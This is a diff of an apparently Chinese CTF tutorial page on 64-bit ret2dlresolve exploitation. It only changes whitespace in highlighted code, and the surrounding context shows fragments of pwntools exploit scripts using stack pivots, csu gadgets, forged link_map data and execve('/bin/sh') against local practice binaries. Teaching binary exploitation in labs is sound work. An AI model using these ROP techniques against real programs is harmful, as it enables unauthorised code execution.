-</code></pre></div> <p>到了这里我们发现，与 32 位不同，在 64 位下进行栈迁移然后利用 ret2dlresolve 攻击需要精心构造栈的位置，以避免破坏 .dynamic 节的内容。</p> <p>这里我们同时给出另外一种方法，即通过多次使用 vuln 函数进行漏洞利用。这种方式看起来会更加清晰一些。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <p>到了这里我们发现，与 32 位不同，在 64 位下进行栈迁移然后利用 ret2dlresolve 攻击需要精心构造栈的位置，以避免破坏 .dynamic 节的内容。</p> <p>这里我们同时给出另外一种方法，即通过多次使用 vuln 函数进行漏洞利用。这种方式看起来会更加清晰一些。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=c1># context.log_level=&quot;debug&quot;</span>
 <span class=c1># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span>
 <span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span>
@@ -1263,7 +1263,7 @@ exp-no-relro-stack-pivot.py  main_no_relro_64
 <span class=n>csu_end_addr</span> <span class=o>=</span> <span class=mh>0x40076A</span>
 <span class=n>leave_ret</span>  <span class=o>=</span><span class=mh>0x40063c</span>
 <span class=n>poprbp_ret</span> <span class=o>=</span> <span class=mh>0x400588</span>
-<span class=k>def</span> <span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
     <span class=c1># pop rbx, rbp, r12, r13, r14, r15</span>
     <span class=c1># rbx = 0</span>
     <span class=c1># rbp = 1, enable not to jump</span>
@@ -1381,7 +1381,7 @@ LOAD:0000000000400320<span class=w>      </span>Elf64_Sym<span class=w> </span>&
 .plt:0000000000400516 ; ---------------------------------------------------------------------------
 .plt:0000000000400516                 push    0
 .plt:000000000040051B                 jmp     sub_400500
-</code></pre></div> <h5 id=first-try-leak>First Try - leak<a class=headerlink href=#first-try-leak title="Permanent link">&para;</a></h5> <p>根据上述的分析，我们可以写出如下脚本</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <h5 id=first-try-leak>First Try - leak<a class=headerlink href=#first-try-leak title="Permanent link">&para;</a></h5> <p>根据上述的分析，我们可以写出如下脚本</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=c1># context.log_level=&quot;debug&quot;</span>
 <span class=c1># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span>
 <span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span>
@@ -1393,7 +1393,7 @@ LOAD:0000000000400320<span class=w>      </span>Elf64_Sym<span class=w> </span>&
 <span class=n>csu_end_addr</span> <span class=o>=</span> <span class=mh>0x40079A</span>
 <span class=n>vuln_addr</span> <span class=o>=</span> <span class=mh>0x400637</span>
 
-<span class=k>def</span> <span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
     <span class=c1># pop rbx, rbp, r12, r13, r14, r15</span>
     <span class=c1># rbx = 0</span>
     <span class=c1># rbp = 1, enable not to jump</span>
@@ -1408,7 +1408,7 @@ LOAD:0000000000400320<span class=w>      </span>Elf64_Sym<span class=w> </span>&
     <span class=k>return</span> <span class=n>payload</span>
 
 
-<span class=k>def</span> <span class=nf>ret2dlresolve_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>store_addr</span><span class=p>,</span> <span class=n>func_name</span><span class=p>,</span> <span class=n>resolve_addr</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>ret2dlresolve_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>store_addr</span><span class=p>,</span> <span class=n>func_name</span><span class=p>,</span> <span class=n>resolve_addr</span><span class=p>):</span>
     <span class=n>plt0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
 
     <span class=n>rel_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.rela.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
@@ -1550,7 +1550,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x7fa4b09f7ea8 &lt;_dl_fixup+104&gt;    xor    r8d, r8d
    0x7fa4b09f7eab &lt;_dl_fixup+107&gt;    test   rax, rax
    0x7fa4b09f7eae &lt;_dl_fixup+110&gt;    je     _dl_fixup+156 &lt;_dl_fixup+156&gt;
-</code></pre></div> <p>因此，我们可以简单修改下 exp。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <p>因此，我们可以简单修改下 exp。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=c1># context.log_level=&quot;debug&quot;</span>
 <span class=c1># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span>
 <span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span>
@@ -1562,7 +1562,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 <span class=n>csu_end_addr</span> <span class=o>=</span> <span class=mh>0x40079A</span>
 <span class=n>vuln_addr</span> <span class=o>=</span> <span class=mh>0x400637</span>
 
-<span class=k>def</span> <span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
     <span class=c1># pop rbx, rbp, r12, r13, r14, r15</span>
     <span class=c1># rbx = 0</span>
     <span class=c1># rbp = 1, enable not to jump</span>
@@ -1577,7 +1577,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
     <span class=k>return</span> <span class=n>payload</span>
 
 
-<span class=k>def</span> <span class=nf>ret2dlresolve_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>store_addr</span><span class=p>,</span> <span class=n>func_name</span><span class=p>,</span> <span class=n>resolve_addr</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>ret2dlresolve_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>store_addr</span><span class=p>,</span> <span class=n>func_name</span><span class=p>,</span> <span class=n>resolve_addr</span><span class=p>):</span>
     <span class=n>plt0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
 
     <span class=n>rel_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.rela.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
@@ -1680,7 +1680,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
         path: 0x7f7f3f8b20fa ◂— 0x68732f6e69622f /* &#39;/bin/sh&#39; */
         argv: 0x7ffe63677000 —▸ 0x7f7f3f8b20ff ◂— 0x2074697865006873 /* &#39;sh&#39; */
         envp: 0x7ffe636770a8 ◂— 0x10000
-</code></pre></div> <p>即环境变量的地址指向了一个莫名的地址，这应该是我们在进行 ROP 的时候破坏了栈上的数据。那我们可以调整调整，使其为 NULL 或者尽可能不破坏原有的数据。这里我们选择使其为 NULL。</p> <p>首先，我们可以把读伪造的数据和 /bin/sh 部分的 rop 合并起来，以减少 ROP 的次数</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <p>即环境变量的地址指向了一个莫名的地址，这应该是我们在进行 ROP 的时候破坏了栈上的数据。那我们可以调整调整，使其为 NULL 或者尽可能不破坏原有的数据。这里我们选择使其为 NULL。</p> <p>首先，我们可以把读伪造的数据和 /bin/sh 部分的 rop 合并起来，以减少 ROP 的次数</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=c1># context.log_level=&quot;debug&quot;</span>
 <span class=c1># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span>
 <span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span>
@@ -1692,7 +1692,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 <span class=n>csu_end_addr</span> <span class=o>=</span> <span class=mh>0x40079A</span>
 <span class=n>vuln_addr</span> <span class=o>=</span> <span class=mh>0x400637</span>
 
-<span class=k>def</span> <span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
     <span class=c1># pop rbx, rbp, r12, r13, r14, r15</span>
     <span class=c1># rbx = 0</span>
     <span class=c1># rbp = 1, enable not to jump</span>
@@ -1707,7 +1707,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
     <span class=k>return</span> <span class=n>payload</span>
 
 
-<span class=k>def</span> <span class=nf>ret2dlresolve_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>store_addr</span><span class=p>,</span> <span class=n>func_name</span><span class=p>,</span> <span class=n>resolve_addr</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>ret2dlresolve_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>store_addr</span><span class=p>,</span> <span class=n>func_name</span><span class=p>,</span> <span class=n>resolve_addr</span><span class=p>):</span>
     <span class=n>plt0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
 
     <span class=n>rel_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.rela.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
@@ -1813,7 +1813,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
         path: 0x7f5a188d50fa ◂— 0x68732f6e69622f /* &#39;/bin/sh&#39; */
         argv: 0x7fff68270410 —▸ 0x7f5a188d50ff ◂— 0x2074697865006873 /* &#39;sh&#39; */
         envp: 0x7fff68270538 ◂— 0x6161616100000000
-</code></pre></div> <p>这时候 envp 被污染的数据就只有 0x61 了，即我们填充的数据 'a'。那就好办了，我们只需要把所有的 pad 都替换为 <code>\x00</code> 即可。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <p>这时候 envp 被污染的数据就只有 0x61 了，即我们填充的数据 'a'。那就好办了，我们只需要把所有的 pad 都替换为 <code>\x00</code> 即可。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=c1># context.log_level=&quot;debug&quot;</span>
 <span class=c1># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span>
 <span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span>
@@ -1825,7 +1825,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 <span class=n>csu_end_addr</span> <span class=o>=</span> <span class=mh>0x40079A</span>
 <span class=n>vuln_addr</span> <span class=o>=</span> <span class=mh>0x400637</span>
 
-<span class=k>def</span> <span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
     <span class=c1># pop rbx, rbp, r12, r13, r14, r15</span>
     <span class=c1># rbx = 0</span>
     <span class=c1># rbp = 1, enable not to jump</span>
@@ -1840,7 +1840,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
     <span class=k>return</span> <span class=n>payload</span>
 
 
-<span class=k>def</span> <span class=nf>ret2dlresolve_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>store_addr</span><span class=p>,</span> <span class=n>func_name</span><span class=p>,</span> <span class=n>resolve_addr</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>ret2dlresolve_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>store_addr</span><span class=p>,</span> <span class=n>func_name</span><span class=p>,</span> <span class=n>resolve_addr</span><span class=p>):</span>
     <span class=n>plt0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
 
     <span class=n>rel_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.rela.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
@@ -2083,7 +2083,7 @@ iromise
 .got.plt:0000000000601030 off_601030      dq offset read          ; DATA XREF: _read↑r
 .got.plt:0000000000601030 _got_plt        ends
 .got.plt:0000000000601030
-</code></pre></div> <p>与此同时，通过阅读 <code>_dl_fixup</code> 函数的代码，在设置 <code>__builtin_expect(ELFW(ST_VISIBILITY)(sym-&gt;st_other), 0)</code> 为 0 后，我们可以发现，该函数主要依赖了 link_map 中 l_info 的内容。因此，我们同样需要伪造该部分所需要的内容。</p> <p>利用代码如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <p>与此同时，通过阅读 <code>_dl_fixup</code> 函数的代码，在设置 <code>__builtin_expect(ELFW(ST_VISIBILITY)(sym-&gt;st_other), 0)</code> 为 0 后，我们可以发现，该函数主要依赖了 link_map 中 l_info 的内容。因此，我们同样需要伪造该部分所需要的内容。</p> <p>利用代码如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=c1># context.log_level=&quot;debug&quot;</span>
 <span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&quot;tmux&quot;</span><span class=p>,</span><span class=s2>&quot;splitw&quot;</span><span class=p>,</span><span class=s2>&quot;-h&quot;</span><span class=p>]</span>
 <span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s2>&quot;amd64&quot;</span>
@@ -2096,7 +2096,7 @@ iromise
 <span class=n>vuln_addr</span> <span class=o>=</span> <span class=mh>0x400637</span>
 
 
-<span class=k>def</span> <span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
     <span class=c1># pop rbx, rbp, r12, r13, r14, r15</span>
     <span class=c1># rbx = 0</span>
     <span class=c1># rbp = 1, enable not to jump</span>
@@ -2111,7 +2111,7 @@ iromise
     <span class=k>return</span> <span class=n>payload</span>
 
 
-<span class=k>def</span> <span class=nf>ret2dlresolve_with_fakelinkmap_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>fake_linkmap_addr</span><span class=p>,</span> <span class=n>known_function_ptr</span><span class=p>,</span> <span class=n>offset_of_two_addr</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>ret2dlresolve_with_fakelinkmap_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>fake_linkmap_addr</span><span class=p>,</span> <span class=n>known_function_ptr</span><span class=p>,</span> <span class=n>offset_of_two_addr</span><span class=p>):</span>
 <span class=w>    </span><span class=sd>&#39;&#39;&#39;</span>
 <span class=sd>    elf: is the ELF object</span>
 
@@ -2240,7 +2240,7 @@ iromise
 </code></pre></div> <p>那如果我们控制 rbp 为写的地址加上 0x10，即 targetaddr+0x10，然后再跳转到 0x400505，即栈的结构为</p> <div class=highlight><pre><span></span><code>return_addr -&gt; 0x400505
 rbp         -&gt; target addr + 0x10
 fake buf
-</code></pre></div> <p>那么我们就可以控制程序在目标地址处写 16 个字节。通过不断地这样操作，我们就可以不断地读取 16 个字节，从而达到读取任意长字节的目的。</p> <h3 id=1modify-dynamic-section>方法1：modify dynamic section<a class=headerlink href=#1modify-dynamic-section title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <p>那么我们就可以控制程序在目标地址处写 16 个字节。通过不断地这样操作，我们就可以不断地读取 16 个字节，从而达到读取任意长字节的目的。</p> <h3 id=1modify-dynamic-section>方法1：modify dynamic section<a class=headerlink href=#1modify-dynamic-section title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=c1># context.log_level=&quot;debug&quot;</span>
 <span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&quot;tmux&quot;</span><span class=p>,</span><span class=s2>&quot;splitw&quot;</span><span class=p>,</span><span class=s2>&quot;-h&quot;</span><span class=p>]</span>
 <span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span>
@@ -2252,7 +2252,7 @@ fake buf
 <span class=n>csu_first_addr</span> <span class=o>=</span> <span class=mh>0x40058A</span>
 <span class=n>csu_second_addr</span> <span class=o>=</span> <span class=mh>0x400570</span>
 
-<span class=k>def</span> <span class=nf>csu_gadget</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>func_ptr</span><span class=p>,</span> <span class=n>edi</span><span class=p>,</span> <span class=n>rsi</span><span class=p>,</span> <span class=n>rdx</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>csu_gadget</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>func_ptr</span><span class=p>,</span> <span class=n>edi</span><span class=p>,</span> <span class=n>rsi</span><span class=p>,</span> <span class=n>rdx</span><span class=p>):</span>
     <span class=c1># rdx = r13</span>
     <span class=c1># rsi = r14</span>
     <span class=c1># rdi = r15d</span>
@@ -2261,7 +2261,7 @@ fake buf
     <span class=k>return</span> <span class=n>flat</span><span class=p>([</span><span class=n>csu_first_addr</span><span class=p>,</span> <span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>func_ptr</span><span class=p>,</span> <span class=n>rdx</span><span class=p>,</span>
                     <span class=n>rsi</span><span class=p>,</span> <span class=n>edi</span><span class=p>,</span> <span class=n>csu_second_addr</span><span class=p>],</span> <span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x38</span>
 
-<span class=k>def</span> <span class=nf>read16bytes</span><span class=p>(</span><span class=n>targetaddr</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>read16bytes</span><span class=p>(</span><span class=n>targetaddr</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
     <span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>16</span>
     <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>targetaddr</span><span class=o>+</span><span class=mh>0x10</span><span class=p>)</span>
     <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x400505</span><span class=p>)</span>
@@ -2345,7 +2345,7 @@ fake buf
 .text:00000000001101C2                 syscall                 ; LINUX - sys_read
 </code></pre></div> <p>libc 的版本为</p> <div class=highlight><pre><span></span><code>❯ ./libc.so.6
 GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.
-</code></pre></div> <p>需要注意，不同 libc 的偏移可能不一样。</p> <p>完整代码如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <p>需要注意，不同 libc 的偏移可能不一样。</p> <p>完整代码如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&quot;tmux&quot;</span><span class=p>,</span> <span class=s2>&quot;splitw&quot;</span><span class=p>,</span> <span class=s2>&quot;-h&quot;</span><span class=p>]</span>
 <span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;error&#39;</span>
 <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./readable&quot;</span><span class=p>)</span>
@@ -2353,7 +2353,7 @@ GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.
 <span class=n>csu_second_addr</span> <span class=o>=</span> <span class=mh>0x400570</span>
 
 
-<span class=k>def</span> <span class=nf>read16bytes</span><span class=p>(</span><span class=n>targetaddr</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>read16bytes</span><span class=p>(</span><span class=n>targetaddr</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
     <span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>16</span>
     <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>targetaddr</span><span class=o>+</span><span class=mh>0x10</span><span class=p>)</span>
     <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x400505</span><span class=p>)</span>
@@ -2363,7 +2363,7 @@ GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.
     <span class=k>return</span> <span class=n>payload</span>
 
 
-<span class=k>def</span> <span class=nf>csu_gadget</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>csu_gadget</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
     <span class=c1># rdx = r13</span>
     <span class=c1># rsi = r14</span>
     <span class=c1># rdi = r15d</span>
@@ -2374,7 +2374,7 @@ GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.
     <span class=k>return</span> <span class=n>payload</span>
 
 
-<span class=k>def</span> <span class=nf>bruteforce</span><span class=p>():</span>
+<span class=k>def</span><span class=w> </span><span class=nf>bruteforce</span><span class=p>():</span>
     <span class=n>rop_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
     <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>256</span><span class=p>):</span>
         <span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./readable&quot;</span><span class=p>)</span>
@@ -2404,7 +2404,7 @@ GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.
         <span class=n>io</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
 
 
-<span class=k>def</span> <span class=nf>exp</span><span class=p>():</span>
+<span class=k>def</span><span class=w> </span><span class=nf>exp</span><span class=p>():</span>
     <span class=n>rop_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
     <span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./readable&quot;</span><span class=p>)</span>
     <span class=n>execve_number</span> <span class=o>=</span> <span class=mi>59</span>
@@ -2471,13 +2471,13 @@ LOAD:0000000000600A08                 Elf64_Dyn &lt;0Ah, 69h&gt;    ; DT_STRSZ
 .plt:00000000004004F6 ; ---------------------------------------------------------------------------
 .plt:00000000004004F6                 push    1
 .plt:00000000004004FB                 jmp     sub_4004D0
-</code></pre></div> <p>利用脚本如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <p>利用脚本如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=n>context</span><span class=o>.</span><span class=n>terminal</span><span class=o>=</span><span class=p>[</span><span class=s2>&quot;tmux&quot;</span><span class=p>,</span><span class=s2>&quot;splitw&quot;</span><span class=p>,</span><span class=s2>&quot;-h&quot;</span><span class=p>]</span>
 <span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;blinkroot&quot;</span><span class=p>)</span>
 <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;blinkroot&quot;</span><span class=p>)</span>
